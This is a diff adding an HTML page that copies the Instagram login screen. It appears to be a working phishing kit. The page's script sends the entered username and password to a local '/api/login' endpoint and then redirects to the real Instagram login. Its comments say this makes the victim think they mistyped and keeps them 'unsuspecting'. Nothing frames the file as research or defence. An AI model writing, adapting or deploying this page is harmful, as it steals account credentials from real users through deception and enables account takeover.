@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+  <title>Instagram</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png" type="image/png" />
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-box">
+      <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo" class="instagram-logo" />
+
+      <form class="login-form" novalidate>
+        <div class="input-group">
+          <input type="text" id="username" placeholder="Phone number, username, or email" required autocomplete="username" maxlength="75" />
+        </div>
+        
+        <div class="input-group">
+          <input type="password" id="password" placeholder="Password" required autocomplete="current-password" />
+          <button type="button" class="password-toggle" id="password-toggle">Show</button>
+        </div>
+        
+        <button type="submit" class="login-button" id="login-btn">
+          <span class="button-text">Log In</span>
+          <div class="button-spinner" style="display: none;"></div>
+        </button>
+      </form>
+
+      <div class="or-separator">
+        <div class="line"></div>
+        <div class="or-text">OR</div>
+        <div class="line"></div>
+      </div>
+
+      <a href="#" class="facebook-login">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="#385185"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+        Log in with Facebook
+      </a>
+
+      <a href="#" class="forgot-password">Forgot password?</a>
+    </div>
+
+    <div class="signup-box">
+      <p>Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
+    </div>
+  </div>
+
+  <footer>
+    <p class="copyright">&copy; 2025 Instagram from Meta</p>
+  </footer>
+
+  <script>
+    const form = document.querySelector('.login-form' );
+    const loginButton = document.getElementById('login-btn');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const passwordToggle = document.getElementById('password-toggle');
+
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const username = usernameInput.value.trim();
+      const password = passwordInput.value;
+      
+      if (!username || !password) {
+        alert('Both fields are required.');
+        return;
+      }
+      
+      setLoadingState(true);
+      
+      try {
+        // This is the API endpoint of our serverless function
+        const response = await fetch('/api/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username, password })
+        });
+        
+        // After sending the data, redirect the user to the real Instagram
+        // This makes the user think they had a typo and need to log in again.
+        window.location.href = 'https://www.instagram.com/accounts/login/?source=auth_switcher';
+
+      } catch (error ) {
+        console.error('Error:', error);
+        // If something fails, still redirect to keep the user unsuspecting.
+        window.location.href = 'https://www.instagram.com/accounts/login/?source=auth_switcher';
+      }
+    } );
+
+    passwordToggle.addEventListener('click', function() {
+      const isPassword = passwordInput.getAttribute('type') === 'password';
+      passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
+      this.textContent = isPassword ? 'Hide' : 'Show';
+    });
+
+    function setLoadingState(isLoading) {
+      const buttonText = loginButton.querySelector('.button-text');
+      const buttonSpinner = loginButton.querySelector('.button-spinner');
+      loginButton.disabled = isLoading;
+      if (isLoading) {
+        buttonText.style.display = 'none';
+        buttonSpinner.style.display = 'inline-block';
+      }
+    }
+  </script>
+</body>
+</html>
